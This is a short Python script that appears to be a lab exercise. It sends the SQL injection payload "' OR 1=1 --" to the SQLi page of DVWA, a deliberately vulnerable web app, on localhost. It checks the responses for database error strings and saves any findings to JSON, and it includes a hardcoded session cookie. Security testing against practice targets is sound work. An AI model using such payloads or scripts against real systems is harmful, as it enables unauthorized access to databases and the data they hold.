import requests
import json
from urllib.parse import urljoin

# ---------------- CONFIG ---------------- #
BASE_URL = "http://localhost/dvwa/"
SQLI_URL = urljoin(BASE_URL, "vulnerabilities/sqli/")
RESULT_FILE = "sqli_results.json"

# 🔥 USE YOUR REAL COOKIE VALUES HERE
cookies = {
    "PHPSESSID": "5f06g1gnnmhp4iq5et39i3e97s",
    "security": "low"
}

payloads = [
    "' OR 1=1 --"
]

sql_errors = [
    "mysqli_sql_exception",
    "you have an error in your sql syntax",
    "fatal error"
]

session = requests.Session()

# ---------------- SQLI TEST ---------------- #
def test_sqli():

    vulnerable = []

    print("\n[+] Starting SQL Injection Testing...\n")

    for payload in payloads:

        print(f"[*] Testing payload: {payload}")

        params = {
            "id": payload,
            "Submit": "Submit"
        }

        response = session.get(SQLI_URL, params=params, cookies=cookies)

        # Check if redirected to login
        if "login.php" in response.url:
            print("[!] Session invalid. Update PHPSESSID from browser.")
            return vulnerable

        response_text = response.text.lower()

        for error in sql_errors:
            if error in response_text:
                print(f"[!] SQL Injection Found!")
                print(f"    Payload: {payload}\n")

                vulnerable.append({
                    "url": SQLI_URL,
                    "method": "GET",
                    "payload": payload,
                    "type": "SQL Injection",
                    "severity": "High"
                })
                break

    return vulnerable


# ---------------- MAIN ---------------- #
if __name__ == "__main__":

    results = test_sqli()

    with open(RESULT_FILE, "w") as rf:
        json.dump({"vulnerabilities": results}, rf, indent=4)

    print("\nSQL Injection Testing Completed ✅")
    print("Results saved in sqli_results.json")
